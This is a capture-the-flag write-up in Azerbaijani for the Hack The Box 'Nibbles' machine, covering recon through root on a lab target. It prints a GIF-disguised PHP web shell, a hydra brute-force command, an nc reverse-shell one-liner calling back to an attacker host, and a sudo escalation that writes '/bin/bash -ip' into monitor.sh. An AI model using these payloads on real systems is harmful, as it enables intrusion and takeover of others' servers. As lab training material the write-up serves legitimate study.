# Nibbles (HTB)

> Platforma: Hack The Box  
> OS: Linux  
> Çətinlik: Asan  
> Nəticə: root

---

## Hücum Zənciri

```text
Reconnaissance
├── nmap -sC -sV -A → 22 (OpenSSH 7.2p2), 80 (Apache 2.4.18 Ubuntu 16.04)
└── Burp → HTML comment: <!-- /nibbleblog/ directory. Nothing interesting here! -->

Foothold
├── /nibbleblog/ → "Powered by Nibbleblog"
├── /nibbleblog/admin/boot/rules/98-constants.bit → NIBBLEBLOG_VERSION = 4.0.3 "Coffee"
├── searchsploit nibbleblog → php/remote/38489.rb (Arbitrary File Upload)
├── /nibbleblog/update.php → ./content/private/
├── /nibbleblog/content/private/users.xml → username: admin
├── hydra → IP got blacklisted
├── new VPN IP → admin:<PASSWORD>
└── /nibbleblog/admin.php?controller=plugins&action=list → My Image plugin

Exploitation (File Upload)
├── cmd.php: GIF8; <?php echo system($_REQUEST['ipp']); ?>
├── Upload via My Image → /nibbleblog/content/private/plugins/my_image/image.php
├── ?ipp=whoami → RCE (nibbler)
└── Reverse shell via POST → nc -lvnp 9001

Lateral Movement / User Flag
├── /home/nibbler/user.txt
└── Stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")'

Privilege Escalation
├── sudo -l → (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
├── mkdir -p personal/stuff
├── echo '/bin/bash -ip' > monitor.sh && chmod +x monitor.sh
├── sudo ./monitor.sh → root
└── cat /root/root.txt
```

> Qeyd: Bütün flaglar, parollar və heşlər etik səbəblərə görə maskalanmışdır.

---

## Maşın Brifinqi

Ubuntu 16.04, Apache 2.4.18 ilə. Veb serverdə Nibbleblog 4.0.3 "Coffee" yerləşir. My Image plaqini genişlənmə yoxlaması olmadan fayl yükləməyə imkan verir.

---

## Kəşfiyyat

### Port Skanı

```bash
sudo nmap -sC -sV -A -T5 -Pn 10.129.96.84
```

| Port | Xidmət | Versiya                         |
|------|--------|---------------------------------|
| 22   | SSH    | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80   | HTTP   | Apache httpd 2.4.18 (Ubuntu)    |

Port 5904 filtrlənib.

### Stekin Müəyyən Edilməsi

Burp cavabında HTML şərhi tapıldı:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

---

## Foothold

### Nibbleblog Versiyasının Müəyyən Edilməsi

```bash
curl http://10.129.96.84/nibbleblog/admin/boot/rules/98-constants.bit
```

```php
define('NIBBLEBLOG_VERSION', '4.0.3');
define('NIBBLEBLOG_NAME',    'Coffee');
```

### Açıq Exploitlərin Axtarışı

```bash
searchsploit nibbleblog
```

| Exploit Adı                                           | Yol                   |
|-------------------------------------------------------|-----------------------|
| Nibbleblog 3 - Multiple SQL Injections                | php/webapps/35865.txt |
| Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb   |

Analiz üçün kopyalayırıq:

```bash
searchsploit -m php/remote/38489.rb
```

### Exploitin Əsas Sahələri

```ruby
'uri' => normalize_uri(target_uri.path, 'admin.php'),
'vars_get' => {
  'controller' => 'plugins',
  'action'     => 'config',
  'plugin'     => 'my_image'
}
```

Zəiflik: My Image plaqini vasitəsilə yükləmə zamanı faylın orijinal genişlənməsi saxlanılır, tip yoxlanılmır - PHP yükləmək mümkündür.

### Giriş Məlumatlarının Əldə Edilməsi

```bash
curl http://10.129.96.84/nibbleblog/update.php
# DB updated: ./content/private/config.xml
# DB updated: ./content/private/comments.xml

curl http://10.129.96.84/nibbleblog/content/private/users.xml
```

`admin` istifadəçisini görürük. Hydra ilə ilk brute-force cəhdi:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou-50.txt 10.129.96.84 \
  http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password" -t 64
```

5 uğursuz cəhddən sonra IP qara siyahıya düşdü (bax `users.xml`). Həll - VPN profilini dəyişmək, yeni IP almaq və əl ilə tapmaq:

```
admin:<PASSWORD>
```

### Web Shell Yükləmə

GIF8 başlığı ilə `cmd.php` faylı yaradırıq:

```
GIF8;
<?php echo system($_REQUEST['ipp']); ?>
```

Yoxlama:

```bash
file cmd.php
# cmd.php: GIF image data 16188 x 26736
```

`/nibbleblog/admin.php?controller=plugins&action=list` → My Image vasitəsilə yükləmə.

Yükləmədən sonra:

```
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?ipp=whoami
# GIF8; nibbler nibbler
```

### Reverse Shell

```
ipp=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 9001 >/tmp/f
```

Burp Repeaterdə - POST metodu, Ctrl+U ilə URL-encode.

```bash
nc -lvnp 9001
```

### Shellin Sabitləşdirilməsi

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### İstifadəçi Bayrağı

```bash
cat /home/nibbler/user.txt
```

---

## Privilege Escalation

### sudo Sadalaması

```bash
sudo -l
```

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Fayl yoxdur - özümüz yaradırıq:

```bash
mkdir -p personal/stuff
echo '/bin/bash -ip' > personal/stuff/monitor.sh
chmod +x personal/stuff/monitor.sh
sudo ./personal/stuff/monitor.sh
```

Root shell əldə edirik. Bayrağı oxuyuruq:

```bash
cat /root/root.txt
```

---

## Bayraqlar

| Bayraq | Dəyər                          |
|--------|--------------------------------|
| User   | (bax `/home/nibbler/user.txt`) |
| Root   | (bax `/root/root.txt`)         |

---

## Əsas Nəticələr

- **Nibbleblog 4.0.3 My Image plaqini** - genişlənmə və MIME yoxlaması olmadan fayl yükləmə, RCE-yə klassik yol.
- **GIF8 sarğısı** - faylı həqiqətən yenidən qurmadan "şəkil" yoxlamasını keçmək.
- **Nibbleblog IP qara siyahısı** - 5 uğursuz giriş IP-ni bloklayır; VPN profilini dəyişməklə həll olunur.
- **`sudo -l` mövcud olmayan skript üzərində** - əgər root parolsuz faylı root kimi icra etməyə icazə verirsə və fayl yoxdursa, onu özünüz yarada bilərsiniz.
